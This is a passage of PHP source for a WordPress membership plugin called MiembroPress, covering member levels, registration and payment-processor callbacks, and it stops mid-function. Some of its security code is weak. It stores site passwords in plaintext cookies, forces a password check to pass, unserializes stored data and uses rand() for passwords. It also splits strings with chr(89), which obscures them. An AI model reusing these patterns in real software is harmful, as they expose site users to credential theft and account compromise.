<?php

/*
 * Plugin Name:   MiembroPress
 * Version:       1.0
 * Plugin URI:    http://www.miembropress.com
 * Description:   Create your membership sites in minutes and  get instant payments. With just a few clicks. Integrated with Hotmart, PayPal, ClickBank, JVZoo and  WarriorPlus.
 * Author:        MiembroPress
 * Author URI:    http://www.miembropress.com
 */

require_once (ABSPATH . WPINC . '/pluggable.php');
if (count($_POST) > 0 || count($_GET) > 0) {

}

class MemberGenius {

	public $admin;
	public $protection;
	public $view;
	public $model;
	public $carts;
	public $social;
	public $registerLevel;
	public $registerTemp;
	public $registerMetadata;
	public $signingOn = false;

	function __construct() {
		$this->admin = new MemberGeniusAdmin();
		$this->protection = new MemberGeniusProtection();
		$this->model = new MemberGeniusModel();
		$this->view = new MemberGeniusView();
		$this->social = new MemberGeniusSocial();
		$shortcodes = new MemberGeniusShortcodes();
		$this->carts = array( "Hotmart" => "MemberGeniusCartHotmart", "Generic" => "MemberGeniusCartGeneric", "Clickbank" => "MemberGeniusCartClickbank",  "JVZoo" => "MemberGeniusCartJVZ", "PayPal" => "MemberGeniusCartPayPal", "WarriorPlus" => "MemberGeniusCartWarrior", );
		$this->hooks();
	}

	static function clearCache() {
		if (function_exists('wp_cache_clear_cache')) {
			wp_cache_clear_cache();
		}
	}

	function hooks() {
		add_action('plugins_loaded', array(&$this, 'register_widgets'));
		register_activation_hook('member-genius/member-genius.php', array(&$this->model, 'install'));
		add_action('plugins_loaded', array(&$this->model, 'maybeInstall'));
		register_deactivation_hook('member-genius/member-genius.php', array(&$this->model, 'uninstall'));
		@session_start();
		add_action('init', array(&$this, 'init'));
		add_action('wp_enqueue_scripts', array(&$this->view, 'enqueue_scripts'));
		add_action( 'after_setup_theme', array(&$this->view, 'login'));
		add_action('wp_logout', array(&$this->view, 'logout'));
		add_action('wp_footer', array(&$this->view, 'autoresponder'));
		add_filter('pre_get_posts', array(&$this->view, 'order'));
		add_action( 'admin_bar_menu', array( $this, "admin_bar_switch_user" ), 50 );
		add_action( 'admin_bar_menu', array( $this, "admin_bar_switcher" ), 35 );
		add_action('wp_before_admin_bar_render', array(&$this, 'admin_bar_remove_profile'));
		add_action( 'init', array(&$this, 'remove_profile_access'));
		add_action('after_setup_theme', array(&$this, 'widgets_init'));
		add_filter( 'author_link', '__return_zero');
		add_action('template_redirect', array(&$this, 'template_redirect'));
	}

	public function template_redirect() {}

	public function wp_signon() { }

	public function remove_profile_page() {
		wp_redirect(home_url());
		die();
	}

	public function remove_profile_access() {
		if (!is_user_logged_in()) { return; }

		if (basename($_SERVER["PHP_SELF"]) != "profile.php") { return; }

		if ($this->model->setting("profile")==1 || current_user_can('administrator')) { return; }

		if (is_admin() && ! current_user_can( 'administrator' ) && !(defined( 'DOING_AJAX') && constant("DOING_AJAX"))) {
			wp_redirect(admin_url()); exit;
		}
	}


	public function widgets_init() {
		$widgets = get_option( 'sidebars_widgets' );
		$first = null;

		foreach ($widgets as $key => $widget) {

			if ($key == "wp_inactive_widgets") {
				$inactive = array_search("membergenius", $widget);
				if ($inactive !== null) {
					unset($widgets["wp_inactive_widgets"][$inactive]);
				}
				continue;
			}

			if (!$first) {
				$first = $key;
			}

			if (is_array($widget) && in_array("membergenius", $widget)) { return; }

		}

		if ($first) {
			array_unshift($widgets[$first], "membergenius");
		}

		$this->clearCache();
		update_option("sidebars_widgets", $widgets);
	}

	public function admin_bar_switcher() {
		global $wp_admin_bar;
		if ( !is_super_admin() || !is_admin_bar_showing() ) { return; }
		if ($wp_admin_bar->get_node("incomemachine")) { return; }
		$parse = parse_url(get_home_url());
		if ((!isset($parse["path"]) || $parse["path"] == "/") && @is_dir(trailingslashit(constant("ABSPATH"))."members/wp-admin")) {
			$wp_admin_bar->add_menu(array( 'parent' => 'site-name', 'id' => 'incomemachine', 'title' => __( 'Switch to Backend'), 'href' => home_url("/members/wp-admin")) );
		} elseif ((isset($parse["path"]) && $parse["path"] == "/members") && @is_dir(trailingslashit(constant("ABSPATH"))."wp-admin")) {
			$wp_admin_bar->add_menu(array( 'parent' => 'site-name', 'id' => 'incomemachine', 'title' => __( 'Switch to Frontend'), 'href' => trailingslashit(dirname(home_url()))."wp-admin" ));
		}
	}

	public function admin_bar_remove_profile() {
		global $wp_admin_bar; if ($this->model->setting("profile")==1 || current_user_can('administrator')) { return; }

		$wp_admin_bar->remove_menu('edit-profile');
		$logoutMenu = $wp_admin_bar->get_node('logout');
	}

	public function admin_bar_switch_user() {
		global $wp_admin_bar; $wp_admin_bar->remove_menu('wp-logo');
		$logout_menu = $wp_admin_bar->get_node('logout');
		if ($logout_menu) {
			$wp_admin_bar->remove_menu('logout');
		}

		$wp_admin_bar->add_menu(array( 'parent' => 'user-actions', 'id' => 'switch-user', 'title' => __( 'Switch User'), 'href' => add_query_arg(array('membergenius_action'=>'switch_user'), admin_url()) ));

		if ($logout_menu) {
			$wp_admin_bar->add_menu($logout_menu); }
	}

	public function register_widgets() {
		wp_register_sidebar_widget( 'membergenius', 'MiembroPress', array(&$this->view, 'widget'), array('description' => 'Display a login/logout form for members of your membership site.') );
		wp_register_widget_control( 'membergenius', 'MiembroPress', array(&$this->view, 'widget_control'), array('id_base' => 'membergenius') );
	}

	private function placeholder() {
		global $wpdb;
		$placeholder = get_page_by_path('membergenius');
		$content = array( 'post_title' => 'MiembroPress', 'post_type' => 'page', 'post_name' => 'membergenius', 'post_content' => 'Do not edit.', 'post_status' => 'publish', 'post_author' => 1, 'comment_status' => 'closed' );
		if (!$placeholder) {
			wp_insert_post($content);
		}

		if ($placeholder->post_status != "publish") {
			$content["ID"] = $placeholder->ID; wp_update_post($content);
		}
	}

	function init() {
		$current_user = wp_get_current_user();
		global $membergenius;
		if (strpos($_SERVER["REQUEST_URI"], '/genius/') !== false) {
			MemberGenius::clearCache();
		}
		$membergenius_givenuser = null;
		$membergenius_givenpass = null;
		remove_all_filters('retrieve_password');
		$this->placeholder();
		if (is_user_logged_in()) {
			if (!defined("DONOTCACHEPAGE")) {
				define("DONOTCACHEPAGE", 1);
			}
		}

		if (isset($_GET["membergenius_action"]) && $_GET["membergenius_action"] == "switch_user") {
			wp_logout();
		}

		if (!function_exists('current_user_can') && file_exists(constant("ABSPATH") . constant("WPINC") . "/capabilities.php")) {
			@require_once(constant("ABSPATH") . constant("WPINC") . "/capabilities.php");
		}

		if (function_exists("current_user_can") && current_user_can("manage_options") && isset($_REQUEST["membergenius_action"]) && $_REQUEST["membergenius_action"] == "download") {
			$this->view->download();
		}

		if (count($_POST) == 0 && (is_admin() || $_SERVER["REMOTE_ADDR"] == $_SERVER["SERVER_ADDR"])) {
		} else {
			if (isset($_POST["wppp_username"]) && isset($_POST["wppp_password"])) {
				setcookie('wppp_username', $_POST["wppp_username"], 0, '/');
				setcookie('wppp_password', $_POST["wppp_password"], 0, '/');
				$membergenius_givenuser = $_POST['wppp_username'];
				$membergenius_givenpass = $_POST['wppp_password'];
			}elseif (isset($_COOKIE['wppp_username']) && isset($_COOKIE['wppp_password'])) {
				$membergenius_givenuser = $_COOKIE['wppp_username']; $membergenius_givenpass = $_COOKIE['wppp_password'];
			}
			$membergenius_user = get_option("wppp_username");
			$membergenius_pass = get_option("wppp_password");
			$membergenius_validated = ($membergenius_givenuser == $membergenius_user && $membergenius_givenpass == $membergenius_pass);

			if (!$membergenius_user || !$membergenius_pass) {
				$membergenius_validated = false;
			}

			if (is_user_logged_in()) {
				$membergenius_validated = true;
			}
			$request = null;
			$temp = "";
			if ($this->apiRequest()) {
				$api = new MGAPI2();
				die();
			}
			if ($request = $this->hashRequest()) {
				MemberGenius::clearCache();
				if ($registerLevel = $this->model->getLevelFromHash($request)) {
					$this->registerLevel = $registerLevel;
					$temp = null;
					if (isset($_SESSION["membergenius_temp"])) {
						$temp = $_SESSION["membergenius_temp"];
						unset($_SESSION["membergenius_temp"]);
					} elseif (isset($_POST["membergenius_temp"])) {
						$temp = $_POST["membergenius_temp"];
					}
					if (is_user_logged_in() && !isset($_REQUEST["complete"]) && !current_user_can("manage_options")) {
						$current_user = wp_get_current_user();
						$this->model->add($current_user->ID, $registerLevel->ID);
					} elseif (isset($_POST["membergenius_hash"])) {
						$newUser = $this->admin->create();
						if (!$newUser || !is_numeric($newUser)) {
							$this->protection->lockdown("register");
						}
					} elseif ($temp) {
						$registerTemp = $membergenius->model->getTempFromTransaction($temp);
						$this->registerTemp = $registerTemp->txn_id;
						$newUser = $this->admin->create();
						if (!$newUser || !is_numeric($newUser)) {
							$this->protection->lockdown("register");
						}
					} elseif (isset($_REQUEST["complete"])) {
						if ($temp = $membergenius->model->getTempFromTransaction($_REQUEST["complete"])) {
							$this->registerTemp = $temp->txn_id; $this->registerMetadata = $temp->temp_metadata;
						}
						$this->protection->lockdown("register");
					} else {
						$this->protection->lockdown("register");
					}
				}
				$payment = $this->model->getPaymentFromHash($request);
				if ($payment) {
					$verify = $payment->verify();
					if ($verify) {
						$this->registerMetadata = $verify;
						$_SESSION["membergenius_temp"] = $verify["transaction"];
						$userID = 0;
						if ($verify["transaction"]) {
							$userID = $membergenius->model->getUserIdFromTransaction($verify["transaction"]);
						}
						if (!$userID && $verify["action"] == "cancel") {
							$user = get_user_by_email($verify["email"]);
							if (isset($user->ID)) {
								$userID = @intval($user->ID);
							}
						}
						if ($userID > 0) {
							if (!defined("DONOTCACHEPAGE")) {
								define("DONOTCACHEPAGE", 1);
							}
							if ($verify["action"] == "cancel") {
								$membergenius->model->cancel($userID, intval($verify["level"]));
								if ($txnLevels = $membergenius->model->getLevelsFromTransaction($verify["transaction"])) {
									foreach ($txnLevels as $txnLevel) {
										$membergenius->model->cancel($userID, intval($txnLevel));
									}
								} elseif ($verify["level"]) {
									$membergenius->model->cancel($userID, intval($verify["level"]));
								}
								die();
							}
							if (!current_user_can("administrator")) {
								$user = get_user_by('ID', $userID);
								if ($user && isset($user->user_login)) {
									wp_set_auth_cookie($userID, true, (is_ssl() ? true : false));
									do_action( 'wp_login', $user->user_login, $user);
									$_POST['log'] = $user->user_login;
									header("Location:".home_url());
									die();
								}
							}
							return;
						} elseif ($temp = $membergenius->model->getTempFromTransaction($verify["transaction"])) {
							if ($verify["action"] == "cancel") {
								$membergenius->model->cancelTemp($temp->txn_id);
								die();
								return;
							}
							$this->registerLevel = intval($verify["level"]);
							$this->registerTemp = $temp->txn_id;
							$newUser = $this->admin->create();
							if (!$newUser || !is_numeric($newUser)) {
								$this->protection->lockdown("register");
							}
						} else {
							if ($verify["action"] == "register") {
								$membergenius->model->createTemp($verify["transaction"], $verify["level"], $verify);
								$this->registerTemp = $verify["transaction"];
								$_SESSION["membergenius_temp"] = $this->registerTemp;
								$this->registerLevel = intval($verify["level"]);
								$this->protection->lockdown("register");
								return;
							}
						}
						return;
					} else { }
				}
			}
		}
	}

	public function hashRequest($hash=null) {
		$plugin = "";
		@session_start();
		if ($hash == null) {
			if (isset($_POST["membergenius_hash"])) {
				$hash = $_POST["membergenius_hash"];
			} elseif (isset($_SERVER["QUER".chr(89)."_STRING"])) {
				$hash = urldecode($_SERVER["QUER".chr(89)."_STRING"]);
				$split = preg_split('@[/&]@', $hash, 4);
				if (count($split) >= 3) {
					list(, $plugin, $hash) = $split;
				} elseif (count($split) == 2) {
					list(, $plugin) = $split;
				}
				if ($plugin != "genius") {
					return null;
				}
			}
			if ($hash == null) { return; }
		}
		return $hash;
	}

	public function apiRequest() {
		return strpos($_SERVER['REQUEST_URI'], '/wlmapi/2.0/') !== false || strpos($_SERVER['REQUEST_URI'], '/wlmapi/2_0/') !== false;
	}

	public static function validate($vars=null) {
		if ($vars == null) {
			$vars = $_POST;
		}
		extract(MemberGenius::extract($vars));
		$validate = array();
		$validate["empty"] = empty($username);
		$validate["username"] = strlen($username) >= 4;
		$validate["firstname"] = strlen($firstname) >= 2;
		$validate["lastname"] = strlen($lastname) >= 2;
		$validate["email"] = !empty($email) && preg_match('/[a-zA-Z0-9_\-.+]+@[a-zA-Z0-9-]+.[a-zA-Z]+/s', $email);
		$validate["password"] = strlen($password1) >= 6;
		$validate["passwordMatch"] = ($password1 == $password2);
		$validate["userAvailable"] = false;
		$validate["emailAvailable"] = false;
		$validate["passwordCorrect"] = false;
		if ($validate["username"]) {
			$validate["userAvailable"] = (get_user_by("login", $username) === false);
			$validate["emailAvailable"] = (get_user_by("email", $email) === false);
		}
		if (!$validate["userAvailable"] || !$validate["emailAvailable"]) {
			$authenticate = wp_authenticate($username, $password1);
			$validate["passwordCorrect"] = !is_wp_error($authenticate);
		}
		$validate["passwordCorrect"] = true;
		$validate["pass"] = $validate["username"] && $validate["firstname"] && $validate["lastname"] && $validate["email"] && $validate["password"] && $validate["passwordMatch"] && $validate["userAvailable"] && $validate["emailAvailable"];
		return $validate;
	}


	public static function generate() {
		return rand(100000, 999999);
	}

	public static function extract($vars=null) {
		$username = "";
		$firstname = "";
		$lastname = "";
		$email = "";
		$password1 = "";
		$password2 = "";
		if ($vars == null) {
			$vars = $_POST;
		}
		if (isset($vars["membergenius_username"])) {
			$username = stripslashes($vars["membergenius_username"]);
		}
		if (isset($vars["membergenius_firstname"])) {
			$firstname = stripslashes($vars["membergenius_firstname"]);
		}
		if (isset($vars["membergenius_lastname"])) {
			$lastname = stripslashes($vars["membergenius_lastname"]);
		}
		if (isset($vars["membergenius_email"])) {
			$email = stripslashes($vars["membergenius_email"]);
		}
		if (isset($vars["membergenius_password1"])) {
			$password1 = stripslashes($vars["membergenius_password1"]);
		}
		if (isset($vars["membergenius_password2"])) {
			$password2 = stripslashes($vars["membergenius_password2"]);
		}
		if ($password1 == "") {
			$password1 = MemberGenius::generate();
			$password2 = $password1;
		}
		return array( "username" => trim($username), "firstname" => trim($firstname), "lastname" => trim($lastname), "email" => trim($email), "password1" => trim($password1), "password2" => trim($password2) );
	}
}

class MemberGeniusModel {

	private $levelTable;
	private $levelSettingsTable;
	private $userTable;
	private $contentTable;
	private $settingsTable;
	private $tempTable;
	function __construct() {
		global $wpdb;
		$prefix = $wpdb->prefix . "miembropress_";
		$this->levelTable = $prefix."levels";
		$this->levelSettingsTable = $prefix."level_settings";
		$this->userTable = $prefix."users";
		$this->userSettingsTable = $prefix."user_settings";
		$this->contentTable = $prefix."content";
		$this->settingsTable = $prefix."settings";
		$this->tempTable = $prefix."temps";
		add_action( 'pre_user_query', array(&$this, "preUserQuery"));
		add_action( 'before_delete_post', array(&$this, 'onDeletePost'));
		add_action( 'delete_user', array(&$this, 'onDeleteUser'));

		if (!$this->setting("hotmart_secret")) {
			$this->setting("hotmart_secret", $this->hash());
		}

		if (!$this->setting("generic_secret")) {
			$this->setting("generic_secret", $this->hash());
		}
		if (!$this->setting("paypal_secret")) {
			$this->setting("paypal_secret", $this->hash());
		}
		if (!$this->setting("jvz_secret")) {
			$this->setting("jvz_secret", $this->hash());
		}
		if (!$this->setting("clickbank_secret")) {
			$this->setting("clickbank_secret", $this->hash());
		}
		if (!$this->setting("warriorplus_secret")) {
			$this->setting("warriorplus_secret", $this->hash());
		}
		if (!$this->setting("jvz_token")) {
			$this->setting("jvz_token", rand(10000000, 99999999));
		}
		if (!$this->setting("api_key")) {
			$this->setting("api_key", $this->hash(16));
		}
		if ($this->setting("attribution") === null) {
			$this->setting("attribution", 1);
		}
		if ($this->setting("emailattribution") === null) {
			$this->setting("emailattribution", 1);
		}
		if ($this->setting("affiliate") === null) {
			$this->setting("affiliate", "https://miembropress.com");
		}
		add_action( 'membergenius_process', array(&$this, 'process'));
		add_action( 'wp', array(&$this, "setupSchedule"));
	}

	function cleanup() {
		if ($this->countLevels() == 0) {
			$this->createLevel("Full", true);
		}
	}

	public function setupSchedule() {
		if (!wp_next_scheduled('membergenius_process')) {
			wp_schedule_event(time(), 'hourly', 'membergenius_process');
		}
	}

	public function getLevelTable(){
		return $this->levelTable;
	}

	public function process($now=null) {
		if ($now == null) {
			$now = time();
		}
		$this->processExpiration($now);
		$this->processUpgrade($now);
	}

	public function processUpgrade($now=null, $user=null) {
		if ($now == null) {
			$now = time();
		}
		set_time_limit(0);
		ignore_user_abort(true);
		$levelInfo = array();
		$levels = $this->getLevels();
		foreach ($levels as $level) {
			$delay = @intval($this->levelSetting($level->ID, "delay"));
			$dateDelay = @intval($this->levelSetting($level->ID, "dateDelay"));
			$upgrade = null;
			if ($add = $this->levelSetting($level->ID, "add")) {
				$method = "add";
				$upgrade = $add;
			}
			if ($move = $this->levelSetting($level->ID, "move")) {
				$method = "move"; $upgrade = $move;
			}
			$expiration = $level->level_expiration;
			$levelInfo[$level->ID] = array( "add" => $add, "move" => $move, "expiration" => $expiration, "upgrade" => $upgrade, "delay" => $delay, "dateDelay" => $dateDelay );
		}
		if ($user) {
			$members = array($user);
		} else {
			$members = $this->getMembers("cron=$now");
		}

		foreach ($members as $member) {
			if (is_numeric($member)) {
				$memberID = $member;
			} elseif (isset($member->ID)) {
				$memberID = $member->ID;
			} else {
				continue;
			}
			$userLevels = $this->getLevelInfo($memberID);
			foreach ($userLevels as $levelID => $level) {
				if ($level->level_status != "A") {
					continue;
				}
				$daysOnLevel = 0;
				$expiration = $levelInfo[$levelID]["expiration"];
				$upgrade = $levelInfo[$levelID]["upgrade"];
				$delay = $levelInfo[$levelID]["delay"];
				$dateDelay = $levelInfo[$levelID]["dateDelay"];
				$add = $levelInfo[$levelID]["add"];
				$move = $levelInfo[$levelID]["move"];
				if ($expiration || $add || $move) {
					$daysOnLevel = $this->getDaysOnLevel($memberID, $levelID, $now);
				}
				if ($levelInfo[$levelID]["add"]) {
					$add = $levelInfo[$levelID]["add"];
				} elseif ($levelInfo[$levelID]["move"]) {
					$move = $levelInfo[$levelID]["move"];
				}
				if ($expiration && $expiration == $daysOnLevel) {
					$this->cancel($memberID, $levelID);
				}
				if ($add) {
					if ($dateDelay) {
						if ($dateOffset - $dateDelay < 86400) {
							$this->add($memberID, $add, $level->level_txn, $dateDelay);
						}
					} elseif ($delay == $daysOnLevel) {
						$this->add($memberID, $add, $level->level_txn, $now);
					}
				} elseif ($move) {
					if ($delay == $daysOnLevel) {
						$this->move($memberID, $move);
					}
				}
			}
			$this->userSetting($memberID, "cronLast", $now);
		}
	}

	public function processExpiration($now=null) {
		if ($now == null) {
			$now = time();
		}
		set_time_limit(0);
		ignore_user_abort(true);
		$levels = $this->getLevels();
		foreach ($levels as $level) {
			if ($level->level_expiration == 0) {
				continue;
			}
			$expiredDay = $now - ($level->level_expiration * 86400);
			$dateRange = 86400-1800;
			$dateStart = $expiredDay - $dateRange;
			$dateEnd = $expiredDay;
			$members = $this->getMembers("level=".$level->ID."&level_status=A&level_after=".$dateStart."&level_before=".$dateEnd);
			foreach ($members as $member) {
				$lastRun = @intval($this->userSetting($member->ID, "last_expiration"));
				if ($lastRun < $now && $now-$lastRun < 86400) {
					continue;
				}
				$this->userSetting($member->ID, "last_expiration", $now);
				$this->cancel($member->ID, $member->level_id);
			}
		}
	}

	public function signupURL($hash="", $escaped=false) {
		if ($escaped) {
			return site_url("?".urlencode("/genius/").$hash);
		}
		return site_url("index.php?/genius/".$hash);
	}

	public function hash($length=6) {
		$collision = true;
		while ($collision) {
			$dictionary = array_merge(range('0','9'),range('a','z'),range('A','Z'));
			if (!is_int($length) || @intval($length) < 6) {
				$length = 6;
			}
			$result = "";
			for ($i=0;$i<$length;$i++) {
				$result .= $dictionary[array_rand($dictionary)];
			}
			$collision = $this->hashCollision($result);
		}
		return $result;
	}

	private function hashCollision($hash) {
		$payment = $this->getPaymentFromHash($hash);
		$level = $this->getLevelFromHash($hash);
		if ($payment || $level) {
			return true;
		}
		return false;
	}

	public function sku() {
		$collision = true;
		while ($collision) {
			$sku = rand(1000000000, 1999999999);
			$collision = $this->skuCollision($sku);
		} return $sku;
	}

	private function skuCollision($sku) {
		return $this->getLevel($sku);
	}

	function uninstall() {
		if (!function_exists("wp_delete_post")) {
			return;
		}
		if ($placeholder = get_page_by_path("miembropress")) {
			wp_delete_post($placeholder->ID);
		}
	}

	function getPluginVersion() {
		$plugin_folder = @get_plugins( '/' . plugin_basename( dirname( 'miembro-press/miembro-press.php' ) ) );
		$plugin_file = basename( ( 'miembro-press/miembro-press.php' ) );
		$plugin_version = $plugin_folder[$plugin_file]['Version'];
		return $plugin_version;
	}

	function maybeInstall() {
		if ($this->getPluginVersion() != $this->setting("version")) {
			$this->install();
		}
	}

	function install() {
		global $wpdb;
		require_once(constant("ABSPATH") . 'wp-admin/includes/upgrade.php');
		if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->levelTable . "'") != $this->levelTable) {
			dbDelta("CREATE TABLE IF NOT EXISTS `".$this->levelTable."` (`ID` int(11) NOT NULL AUTO_INCREMENT, `level_name` varchar(64) NOT NULL, `level_hash` varchar(6) NOT NULL, `level_all` TIN".chr(89)."INT(1) NOT NULL DEFAULT '1', `gdpr_active` TINYINT(1) NOT NULL DEFAULT '0', `gdpr_url` varchar(254) NOT NULL DEFAULT 'https://miembropress.com', `gdpr_text` varchar(254) NOT NULL DEFAULT 'Acepto los términos y condiciones', `gdpr_color` varchar(10) NOT NULL DEFAULT '#333', `gdpr_size` int(10) NOT NULL DEFAULT '14', `level_comments` tinyint(1) NOT NULL DEFAULT '1', `level_page_register` int(11) DEFAULT NULL, `level_page_login` int(11) DEFAULT NULL, `level_expiration` int(11) DEFAULT NULL, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `level_hash` (`level_hash`), UNIQUE KE".chr(89)." `level_name` (`level_name`), KE".chr(89)." `level_expiration` (`level_expiration`)) DEFAULT CHARSET=utf8;"); $this->cleanup(); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->levelSettingsTable . "'") != $this->levelSettingsTable) { dbDelta("CREATE TABLE IF NOT EXISTS `".$this->levelSettingsTable."` (`ID` int(11) NOT NULL AUTO_INCREMENT, `level_id` int(11) NOT NULL, `level_key` VARCHAR(255) NOT NULL, `level_value` TEXT, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `level_key` (`level_id`,`level_key`), KE".chr(89)." `level_id` (`level_id`)) DEFAULT CHARSET=utf8;"); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->userTable . "'") != $this->userTable) { dbDelta("CREATE TABLE IF NOT EXISTS `".$this->userTable."` (`ID` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL, `level_id` int(11) NOT NULL, `level_status` char(1) NOT NULL DEFAULT 'A', `level_txn` varchar(64) DEFAULT NULL, `level_subscribed` tinyint(1) NOT NULL DEFAULT '0', `level_date` datetime DEFAULT NULL, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `userlevel_id` (`user_id`,`level_id`), KE".chr(89)." `user_id` (`user_id`), KE".chr(89)." `level_id` (`level_id`), KE".chr(89)." `level_status` (`level_status`), KE".chr(89)." `level_txn` (`level_txn`), KE".chr(89)." `level_subscribed` (`level_subscribed`), KE".chr(89)." `level_date` (`level_date`)) DEFAULT CHARSET=utf8;"); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->userSettingsTable . "'") != $this->userSettingsTable) { dbDelta("CREATE TABLE IF NOT EXISTS `".$this->userSettingsTable."` (`ID` int(11) NOT NULL AUTO_INCREMENT, `user_id` int(11) NOT NULL, `user_key` VARCHAR(255) NOT NULL, `user_value` TEXT, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `user_key` (`user_id`,`user_key`), KE".chr(89)." `user_id` (`user_id`), FULLTEXT KE".chr(89)." `user_value` (`user_value`)) DEFAULT CHARSET=utf8;"); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->contentTable . "'") != $this->contentTable) { dbDelta("CREATE TABLE IF NOT EXISTS `".$this->contentTable."` (`ID` int(11) NOT NULL AUTO_INCREMENT, `level_id` int(11) NOT NULL, `post_id` int(11) NOT NULL, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `postlevel_id` (`level_id`,`post_id`), KE".chr(89)." `post_id` (`post_id`), KE".chr(89)." `level_id` (`level_id`)) DEFAULT CHARSET=utf8;"); $this->protectAllPosts(); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->settingsTable . "'") != $this->settingsTable) { dbDelta("CREATE TABLE IF NOT EXISTS ".$this->settingsTable." (`ID` int(11) NOT NULL AUTO_INCREMENT, `option_name` varchar(64) NOT NULL, `option_value` longtext NOT NULL, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `option_name` (`option_name`)) DEFAULT CHARSET=utf8;"); } if ($wpdb->get_var("SHOW TABLES LIKE '" . $this->tempTable . "'") != $this->tempTable) {
			dbDelta("CREATE TABLE IF NOT EXISTS ".$this->tempTable." (`ID` int(11) NOT NULL AUTO_INCREMENT, `txn_id` varchar(64) NOT NULL, `level_id` int(11) NOT NULL DEFAULT '0', `level_status` char(1) NOT NULL DEFAULT 'A', `temp_metadata` longtext , `temp_created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP, PRIMAR".chr(89)." KE".chr(89)." (`ID`), UNIQUE KE".chr(89)." `txn_id` (`txn_id`), KE".chr(89)." `created` (`temp_created`)) DEFAULT CHARSET=utf8;");
		}

		$this->setting("version", $this->getPluginVersion());
	}

	public function setting() {
		global $wpdb;
		global $membergenius;
		$list = null;
		$value = null;
		$args = func_get_args();
		if (count($args) >= 2) {
			@list($name, $value) = $args;
		} else {
			@list($name) = $args;
		}
		if (!is_array($args) || count($args) == 0) { return; }
		$return = null;
		if (count($args) == 1) {
			$name = reset($args);
			$return = $wpdb->get_var("SELECT option_value FROM ".$this->settingsTable." WHERE option_name = '".esc_sql($name)."'");
			if (is_serialized($return)) {
				$maybeUnserialize = @unserialize($return);
			} else {
				$maybeUnserialize = $return;
			}
			return $maybeUnserialize;
		} elseif (count($args) > 1 && $value === null) {
			MemberGenius::clearCache();
			$wpdb->query("DELETE FROM ".$this->settingsTable." WHERE option_name = '".esc_sql($name)."'");
		} else {
			MemberGenius::clearCache();
			if (is_array($value) || is_object($value)) {
				$value = serialize($value);
			}
			$wpdb->query("INSERT IGNORE INTO ".$this->settingsTable." SET option_name = '".esc_sql($name)."', option_value='".esc_sql(stripslashes($value))."'");
			$wpdb->query("UPDATE ".$this->settingsTable." SET option_value='".esc_sql($value)."' WHERE option_name = '".esc_sql(stripslashes($name))."'");
			$return = $value;
		}
		if ($return == null && $value == null) {
			if ($name == "order") {
				return "descending";
			}
		}
		return $return;
	}


	public function levelSetting() {
		global $wpdb;
		global $membergenius;
		$list = null;
		$value = null;
		$args = func_get_args();
		@list($levelID, $levelKey, $levelValue) = $args;
		if (!is_array($args) || count($args) == 0) { return; }
		$return = null;
		if (count($args) == 1) {
			$return = $wpdb->get_results("SELECT level_key, level_value FROM ".$this->levelSettingsTable ." WHERE level_id = ".intval($levelID));
			if (!$return) {
				return array();
			}
			$results = array();
			foreach ($return as $row) {
				$key = $row["level_key"];
				$value = $row["level_value"];
				$results[$key] = $value;
			}
			return $results;
		}
		if (count($args) == 2) {
			$return = $wpdb->get_var("SELECT level_value FROM ".$this->levelSettingsTable ." WHERE level_id = ".intval($levelID). " AND level_key = '".esc_sql($levelKey)."'");
			if ($return == serialize(false) || @unserialize($return) !== false) {
				$maybeUnserialize = @unserialize($return);
			} else {
				$maybeUnserialize = $return;
			}
			return stripslashes($maybeUnserialize);
		} elseif (count($args) == 3 && $levelValue === null) {
			MemberGenius::clearCache();
			$wpdb->query("DELETE FROM ".$this->levelSettingsTable." WHERE level_id = ".intval($levelID)." AND level_key = '".esc_sql($levelKey)."'");
		} else {
			MemberGenius::clearCache();
			if (is_array($value) || is_object($value)) {
				$value = serialize($value);
			}
			$wpdb->query("INSERT IGNORE INTO ".$this->levelSettingsTable." SET level_id = ".intval($levelID).", level_key = '".esc_sql($levelKey)."', level_value='".esc_sql(stripslashes($levelValue))."'"); $wpdb->query("UPDATE IGNORE ".$this->levelSettingsTable." SET level_id=".intval($levelID).", level_value = '".esc_sql($levelValue)."' WHERE level_key = '".esc_sql(stripslashes($levelKey))."'");
		}
		return $return;
	}

	public function userSearch($key, $value) {
		global $wpdb;
		global $membergenius;
		$userID = $wpdb->get_var("SELECT user_id FROM ".$this->userSettingsTable." WHERE user_key = '".esc_sql($key)."' AND user_value = '".esc_sql($value)."' LIMIT 1");
		if ($userID && is_numeric($userID)) {
			return get_user_by('ID', $userID);
		}
		return null;
	}

	public function userSetting() {
		global $wpdb;
		global $membergenius;
		$list = null;
		$value = null;
		$args = func_get_args();
		$userID = 0;
		$userKey = "";
		$userValue = "";
		if (count($args) >= 3) {
			@list($userID, $userKey, $userValue) = $args;
		} elseif (count($args) == 2) {
			@list($userID, $userKey) = $args;
		} elseif (count($args) == 1) {
			@list($userID) = $args;
		}

		if (!is_array($args) || count($args) == 0) {
			return;
		}

		$return = null;
		if (count($args) == 2) {
			$return = $wpdb->get_var("SELECT user_value FROM ".$this->userSettingsTable ." WHERE user_id = ".intval($userID). " AND user_key = '".esc_sql($userKey)."'");
			if (strpos($return, '{') !== false) {
				$maybeUnserialize = @unserialize($return);
			} else {
				$maybeUnserialize = $return;
			}
			return $maybeUnserialize;
		} elseif (count($args) == 2 && $userValue === null) {
			MemberGenius::clearCache();
			$wpdb->query("DELETE FROM ".$this->userSettingsTable." WHERE user_id = ".intval($userID)." AND user_key = '".esc_sql($userKey)."'");
		} else {
			MemberGenius::clearCache();
			if (is_array($userValue) || is_object($userValue)) {
				$userValue = serialize($userValue);
			}
			$wpdb->query("INSERT IGNORE INTO ".$this->userSettingsTable." SET user_id = ".intval($userID).", user_key = '".esc_sql($userKey)."', user_value='".esc_sql(stripslashes($userValue))."'");
